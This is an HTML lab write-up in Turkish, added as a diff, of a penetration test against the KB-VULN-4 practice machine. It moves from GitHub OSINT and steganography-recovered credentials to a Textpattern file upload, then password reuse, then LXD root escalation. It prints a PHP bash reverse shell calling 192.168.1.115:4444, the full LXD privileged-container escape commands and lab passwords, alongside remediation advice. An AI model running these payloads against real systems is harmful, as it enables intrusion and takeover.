@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KB-VULN-4 — Sızma Testi Raporu</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="wrap">
+  <a class="back" href="../index.html">&larr; efeavcii2</a>
+
+  <div class="hero">
+    <h1>KB-VULN-4</h1>
+    <p class="lead">GitHub OSINT ile başlayan, steganografi ile deşifre edilen kimlik bilgileri üzerinden Textpattern CMS'e sızılan ve LXD grup yanlış yapılandırmasıyla root'a uzanan bir sızma testi süreci.</p>
+  </div>
+
+  <div class="meta">
+    <div><span>Hedef</span>KB-Server (192.168.1.121)</div>
+    <div><span>Zorluk</span>Kritik zafiyet zinciri</div>
+    <div><span>İşletim Sistemi</span>Linux (Ubuntu)</div>
+    <div><span>Kategori</span>Web / OSINT / Privilege Escalation</div>
+    <div><span>Tarih</span>9 Nisan 2026</div>
+  </div>
+
+  <div class="chain">
+    Recon &rarr; GitHub OSINT (KB-DUMP) &rarr; Steganografi (steghide) &rarr; Textpattern CMS Login &rarr; Arbitrary File Upload (RCE) &rarr; <b>www-data</b> &rarr; config.php şifre sızıntısı &rarr; Parola Tekrar Kullanımı &rarr; SSH (machineboy) &rarr; LXD Yetki Yükseltme &rarr; <b>root</b>
+  </div>
+
+  <h2 class="section">01 — Bulgular</h2>
+  <table>
+    <tr><th>#</th><th>Zafiyet</th><th>Etkilenen Sistem</th><th>Risk</th><th>CVSS</th></tr>
+    <tr><td>1</td><td>Zayıf Kimlik Bilgileri (OSINT + Steganografi)</td><td>Textpattern CMS Panel</td><td><span class="badge kritik">Kritik</span></td><td>9.8</td></tr>
+    <tr><td>2</td><td>Arbitrary File Upload (RCE)</td><td>Textpattern CMS — Files Modülü</td><td><span class="badge kritik">Kritik</span></td><td>9.1</td></tr>
+    <tr><td>3</td><td>Parola Tekrar Kullanımı</td><td>Sistem Kullanıcısı (machineboy)</td><td><span class="badge yuksek">Yüksek</span></td><td>7.8</td></tr>
+    <tr><td>4</td><td>LXD Grubu ile Yerel Yetki Yükseltme</td><td>İşletim Sistemi (LXD Grubu)</td><td><span class="badge yuksek">Yüksek</span></td><td>8.8</td></tr>
+  </table>
+
+  <h2 class="section">02 — Bulgu Detayları</h2>
+
+  <div class="finding">
+    <div class="head"><h4>Zayıf Kimlik Bilgileri (OSINT + Steganografi)</h4><span class="badge kritik">Kritik</span></div>
+    <p>Sistem kullanıcısı <b>machineboy</b>'un GitHub hesabı üzerinde <b>KB-DUMP</b> adlı bir depo tespit edildi. Depo içindeki görsel dosyalarına <code>steghide</code> ile steganografi analizi uygulanarak Textpattern admin paneline ait parola gizli veri olarak elde edildi.</p>
+    <p><b>Çözüm:</b> Herkese açık kod/dosya depolarında kimlik bilgisi veya bunlara işaret eden materyal bulundurulmamalı; personel için OSINT hijyeni eğitimi verilmelidir.</p>
+  </div>
+
+  <div class="finding">
+    <div class="head"><h4>Arbitrary File Upload — RCE</h4><span class="badge kritik">Kritik</span></div>
+    <p>Textpattern CMS yönetim panelindeki "Files" modülü yüklenen dosyaların uzantısını yeterince filtrelemiyor. Bu durum, kimlik doğrulaması sonrası bir PHP web shell yüklenerek sunucu üzerinde <b>www-data</b> yetkisiyle kod çalıştırılmasına imkân tanıdı.</p>
+    <p><b>Çözüm:</b> Yüklenen dosyalar için sıkı bir beyaz liste uygulanmalı; <code>.php</code>, <code>.phtml</code> gibi çalıştırılabilir uzantılar kesinlikle reddedilmelidir.</p>
+  </div>
+
+  <div class="finding">
+    <div class="head"><h4>Parola Tekrar Kullanımı</h4><span class="badge yuksek">Yüksek</span></div>
+    <p>Elde edilen shell üzerinden okunan <code>config.php</code> dosyasındaki veritabanı şifresinin, sistem kullanıcısı <b>machineboy</b> için de geçerli olduğu doğrulandı — klasik bir yatay geçiş (lateral movement) senaryosu.</p>
+    <p><b>Çözüm:</b> Uygulama ve işletim sistemi kimlik bilgileri kesinlikle ayrıştırılmalı, hassas config dosyaları <code>chmod 600</code> ile kısıtlanmalıdır.</p>
+  </div>
+
+  <div class="finding">
+    <div class="head"><h4>LXD Yerel Yetki Yükseltme</h4><span class="badge yuksek">Yüksek</span></div>
+    <p><b>machineboy</b> kullanıcısının imtiyazlı <code>lxd</code> grubuna dahil olduğu tespit edildi. Root yetkisine sahip bir Alpine konteyneri oluşturularak ana makinenin kök dizini kısıtlama olmaksızın mount edildi ve tam sistem kontrolü sağlandı.</p>
+    <p><b>Çözüm:</b> Kullanıcılar <code>lxd</code>/<code>lxc</code> gibi yüksek imtiyazlı gruplara gerekmedikçe eklenmemeli; grup üyelikleri periyodik olarak denetlenmelidir.</p>
+  </div>
+
+  <h2 class="section">03 — Saldırı Senaryosu</h2>
+  <p><b>OSINT:</b> machineboy'un GitHub hesabındaki KB-DUMP deposu klonlandı ve içindeki görseller incelendi.</p>
+  <p><b>Steganografi:</b> <code>steghide extract</code> ile görsellere gömülü metinler deşifre edilerek admin panel parolası ele geçirildi.</p>
+  <p><b>İlk Erişim:</b> Elde edilen kimlik bilgileriyle Textpattern paneline girildi; dosya yükleme modülünden bir PHP reverse shell yüklenerek <b>www-data</b> yetkisiyle bağlantı alındı.</p>
+  <p><b>Yatay Geçiş:</b> <code>config.php</code> içindeki veritabanı şifresinin sistem kullanıcısı için de geçerli olduğu doğrulanarak <b>machineboy</b> hesabına geçildi.</p>
+  <p><b>Yetki Yükseltme:</b> machineboy'un <code>lxd</code> grubunda olduğu görülerek ayrıcalıklı bir konteyner oluşturuldu, ana disk mount edilerek root elde edildi.</p>
+
+  <h2 class="section">04 — Kanıtlar (Proof of Concept)</h2>
+
+  <h3>Kanıt 1 — OSINT: GitHub Deposu</h3>
+  <div class="cmd-label">$ git clone</div>
+  <pre>$ git clone https://github.com/machineboy141/KB-DUMP.git
+Cloning into 'KB-DUMP'...
+Receiving objects: 100% (9/9), 403.48 KiB | 1.42 MiB/s, done.
+
+$ unzip KB-DUMP.zip
+  inflating: deniz.jpg
+  inflating: elif.jpg
+  inflating: emre.jpg
+  inflating: mehmet.jpg
+  inflating: omer.jpg
+  inflating: serpil.jpg
+  inflating: yunus.jpg</pre>
+  <figcaption>KB-DUMP deposunun klonlanması ve içindeki medya dosyalarının çıkarılması.</figcaption>
+
+  <h3>Kanıt 2 — Steganografi Analizi</h3>
+  <div class="cmd-label">$ steghide extract</div>
+  <pre>$ for img in *.jpg; do steghide extract -sf "$img"; done
+Enter passphrase:
+wrote extracted data to "steganopayload1125546.txt".
+wrote extracted data to "steganopayload202720.txt".
+
+$ cat steganopayload202720.txt | tr '\!~' 'P~\!-O'
+admin
+
+$ cat steganopayload1125546.txt | tr '\!~' 'P~\!-O'
+ezbircime2021</pre>
+  <figcaption>Gizli verilerin deşifre edilmesiyle admin kullanıcı adı ve parolasının elde edilmesi.</figcaption>
+
+  <h3>Kanıt 3 — İlk Erişim ve Reverse Shell</h3>
+  <div class="cmd-label">shell.php</div>
+  <pre>&lt;?php
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.115/4444 0&gt;&amp;1'");
+?&gt;</pre>
+  <div class="cmd-label">$ nc -lvnp 4444</div>
+  <pre>$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.1.115] from (UNKNOWN) [192.168.1.121] 42040
+www-data@kb-server:/var/www/html/textpattern/files$ python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+  <figcaption>shell.php dosyasının panel üzerinden yüklenmesi ve netcat ile bağlantının yakalanması.</figcaption>
+
+  <h3>Kanıt 4 — Yatay Geçiş</h3>
+  <pre>www-data@kb-server:/var/www/html/textpattern/files$ cat /var/www/html/textpattern/textpattern/config.php
+$txpcfg['pass'] = 'ghostroot510';
+...
+
+www-data@kb-server:$ su machineboy
+Password: ghostroot510
+machineboy@kb-server:~$ id
+uid=1000(machineboy) groups=1000(machineboy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</pre>
+  <figcaption>config.php içindeki şifrenin machineboy sistem kullanıcısı için de geçerli olduğunun doğrulanması.</figcaption>
+
+  <h3>Kanıt 5 — LXD Sömürüsü</h3>
+  <pre>machineboy@kb-server:~$ git clone https://github.com/saghul/lxd-alpine-builder.git
+machineboy@kb-server:~$ lxc image import ./alpine-v3.23-x86_64-*.tar.gz --alias siber
+machineboy@kb-server:~$ lxc init siber siber -c security.privileged=true
+machineboy@kb-server:~$ lxc config device add siber ana_disk disk source=/ path=/mnt/root recursive=true
+machineboy@kb-server:~$ lxc start siber
+machineboy@kb-server:~$ lxc exec siber /bin/sh
+~ # cd /mnt/root/root
+~ # cat root.txt</pre>
+  <figcaption>Alpine konteyneri ile ana makinenin kök dizininin mount edilmesi ve root shell elde edilmesi.</figcaption>
+  <div class="flag">/mnt/root/root/root.txt → sistem tamamen ele geçirildi</div>
+
+  <h2 class="section">05 — Öğrenilen Teknikler</h2>
+  <p>Halka açık kod depolarındaki dosyalarda steganografi ile gizlenmiş kimlik bilgileri; CMS dosya yükleme modüllerinin uzantı filtreleme eksikliği; config dosyalarındaki parolaların sistem kullanıcılarında tekrar kullanılması; ve <code>lxd</code> grup üyeliğinin kısıtlanmamış bir konteyner ile doğrudan root'a çıkış sağlaması.</p>
+
+  <div class="footer">Kişisel lab notu — eğitim amaçlı sızma testi ortamı. Bayrak (flag) değerleri platform politikası gereği paylaşılmamıştır.</div>
+</div>
+</body>
+</html>
